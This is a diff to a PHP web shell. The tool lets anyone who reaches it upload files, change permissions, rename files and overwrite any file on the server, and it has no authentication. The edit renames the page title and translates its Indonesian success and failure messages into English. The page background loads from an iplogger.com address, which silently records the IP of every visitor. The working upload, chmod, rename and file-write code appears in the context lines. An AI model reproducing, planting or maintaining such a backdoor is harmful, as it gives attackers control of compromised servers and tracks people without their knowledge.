@@ -11,7 +11,7 @@ echo '<!DOCTYPE HTML>
 <html>
 <head>
 <link href="" rel="stylesheet" type="text/css">
-<title>LOVE SHELL</title>
+<title>SHELL</title>
 <style>
 body{
 background: url(https://iplogger.com/2dfGE5.jpg);
@@ -46,7 +46,7 @@ border-radius:5px;
 </style>
 </head>
 <body>
-<h1><center><font color="black">WOW SHELL</font></center></h1>
+<h1><center><font color="black">SHELL</font></center></h1>
 <table width="900" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td><font color="black">Path :</font> ';
 if(isset($_GET['path'])){
@@ -74,9 +74,9 @@ echo '">'.$pat.'</a>/';
 echo '</td></tr><tr><td>';
 if(isset($_FILES['file'])){
 if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
-echo '<font color="black">Upload Berhasil</font><br />';
+echo '<font color="green">Upload Succeed</font><br />';
 }else{
-echo '<font color="black">Upload Gagal</font><br/>';
+echo '<font color="red">Upload Failed</font><br/>';
 }
 }
 echo '<form enctype="multipart/form-data" method="POST">
@@ -94,9 +94,9 @@ echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
 if($_POST['opt'] == 'chmod'){
 if(isset($_POST['perm'])){
 if(chmod($_POST['path'],$_POST['perm'])){
-echo '<font color="white">Change Permission Berhasil</font><br/>';
+echo '<font color="green">Change Permission Succeed</font><br/>';
 }else{
-echo '<font color="white">Change Permission Gagal</font><br />';
+echo '<font color="red">Change Permission Failed</font><br />';
 }
 }
 echo '<form method="POST">
@@ -108,9 +108,9 @@ Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o
 }elseif($_POST['opt'] == 'rename'){
 if(isset($_POST['newname'])){
 if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
-echo '<font color="green">Ganti Nama Berhasil</font><br/>';
+echo '<font color="green">Change Name Succeed</font><br/>';
 }else{
-echo '<font color="red">Ganti Nama Gagal</font><br />';
+echo '<font color="red">Change Name Failed</font><br />';
 }
 $_POST['name'] = $_POST['newname'];
 }
@@ -124,9 +124,9 @@ New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'
 if(isset($_POST['src'])){
 $fp = fopen($_POST['path'],'w');
 if(fwrite($fp,$_POST['src'])){
-echo '<font color="white">Berhasil Edit File</font><br/>';
+echo '<font color="green">Edit Succeed</font><br/>';
 }else{
-echo '<font color="white">Gagal Edit File</font><br/>';
+echo '<font color="red">Edit Failed</font><br/>';
 }
 fclose($fp);
 }
